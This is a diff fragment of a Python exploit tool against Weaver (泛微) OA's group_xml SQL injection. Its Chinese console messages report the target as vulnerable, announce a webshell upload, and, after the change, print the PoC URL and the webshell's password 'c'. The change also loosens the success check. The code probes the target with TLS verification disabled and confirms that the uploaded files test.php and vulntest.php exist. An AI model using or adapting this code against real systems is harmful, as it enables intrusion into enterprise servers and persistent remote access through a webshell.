@@ -25,13 +25,13 @@ def main(target_url):
         requests.packages.urllib3.disable_warnings()
         response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=20)
         response_poc=requests.get(url=target_url+'vulntest.php', headers=headers, verify=False, timeout=20)
-        if response.status_code == 200 and response_poc.status_code == 200:
+        if response.status_code == 200:
             console.print(now_time() + " [SUCCESS]  存在泛微OA  group_xml SQL注入:{}".format(target_url)+'vulntest.php', style='bold green')
-            console.print(now_time() + " [INFO]     正在上传webshell", style='bold blue')
+            console.print(now_time() + " [INFO]     poc为:{}".format(vuln_url), style='bold blue')
             response = requests.get(url= exp_url, headers=headers, verify=False, timeout=20)
             response_exp=requests.get(url=target_url+'test.php', headers=headers, verify=False, timeout=20)
             if response.status_code == 200 and response_exp.status_code == 200:
-                console.print(now_time() + " [SUCCESS]  上传webshell成功:{}".format(target_url)+'test.php', style='bold green')
+                console.print(now_time() + " [SUCCESS]  上传webshell成功，密码为c:{}".format(target_url)+'test.php', style='bold green')
             else:
                 console.print(now_time() + " [WARNING]  上传文件失败，原因未知", style='bold red')
         else:
